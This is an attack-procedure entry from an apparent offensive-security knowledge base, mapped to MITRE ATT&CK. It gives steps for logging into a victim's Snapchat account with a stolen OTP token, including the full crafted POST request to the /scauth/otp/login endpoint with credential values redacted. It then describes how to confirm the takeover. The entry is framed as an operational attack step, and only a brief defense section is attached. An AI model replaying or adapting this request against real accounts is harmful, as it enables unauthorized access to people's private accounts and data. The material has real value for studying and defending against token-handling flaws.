---
tags:
  - account-takeover
  - otp-login
  - snapchat
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
  - '[[tools/Python-Script-for-Snapchat-API-Automation]]'
tactics:
  - '[[Privilege Escalation]]'
commands:
  - '[[commands/snapchat-logout-otp-request]]'
  - '[[commands/snapchat-otp-login-request]]'
platforms:
  - Web
  - Cloud (GCP)
  - Mobile (Android)
techniques:
  - '[[Use Alternate Authentication Material]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: df425b82-b70d-4003-9a64-15042b1d35c2
created_at: '2025-12-11T06:10:40.169Z'
updated_at: '2025-12-11T06:10:40.169Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0004]]'
mitre_techniques:
  - '[[T1550]]'
---
# Perform Snapchat Login Using Stolen OTP Token

## Summary

This procedure uses a stolen OTP token from a manipulated logout request to authenticate as the victim user in Snapchat's OTP login endpoint, completing the account takeover.

## Description

After obtaining the OTP token, the attacker sends a login request to /scauth/otp/login with the victim's username and the token, bypassing normal credential requirements. The endpoint processes the token as valid, granting access. This works in Snapchat's GCP-hosted API environment. Expected outcome is full login as the victim.

## Requirements

1. Valid OTP token from previous step
2. Victim's username
3. Device parameters (e.g., device_id, screen dimensions)
4. Tools: [[tools/Burp-Suite]] for request crafting

## Defense

Defensive measures and detection strategies:

- Validate OTP tokens against the requesting user's session
- Implement device fingerprinting to detect anomalous logins
- Alert on logins from new devices or IPs

## Objectives

1. Achieve login as victim using stolen OTP
2. Confirm account takeover
3. Highlight risks of improper token handling

## Instructions

### Step 1: Prepare Login Request

**Context**: Set up the form data with victim's username and stolen token.

Gather necessary parameters like device_id and timestamp.

> Ensure all fields match a typical mobile client request.

### Step 2: Send OTP Login Request

**Context**: Submit the login request to gain access.

**Command** ([[commands/snapchat-otp-login-request]]):
```http
POST /scauth/otp/login HTTP/1.1
Host: gcp.api.snapchat.com
Connection: close
Content-Length: 6213
X-Snapchat-Client-Auth: ██████
X-Snapchat-UUID: ████████
User-Agent: Snapchat/10.78.1.0 ██████
Accept: application/json
Accept-Language: en-GB;q=1, en;q=0.9
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Accept-Encoding: gzip, deflate

application_id=com.snap.framework&attestation=████████&device_id=█████████&dsig=█████&dtoken1i=██████&fidelius_client_init=███████&height=1920&max_video_height=1920&max_video_width=1080&password=███████&reactivation_confirmed=false&req_token=████████&screen_height_in=4.527565&screen_height_px=1920&screen_width_in=2.5590599&screen_width_px=1080&timestamp=1594604398438&token=████&username=█████&width=1080
```

> Set token to stolen OTP and username to victim's.

### Step 3: Verify Login Success

**Context**: Check the response for confirmation.

Look for 'logged: true' and victim's details in the JSON response.

> Attempt account actions to confirm access.

## MITRE ATT&CK Mapping

### Tactics

- [[Privilege Escalation]]

### Techniques

- [[Use Alternate Authentication Material]]

### Sub-Techniques

- None

## Commands Used

- [[commands/snapchat-otp-login-request]]

## Tools Used

- [[tools/Burp-Suite]]
- [[tools/Python-Script-for-Snapchat-API-Automation]]

## Tags

- [[account-takeover]]
- [[commands/snapchat-otp-login-request]]
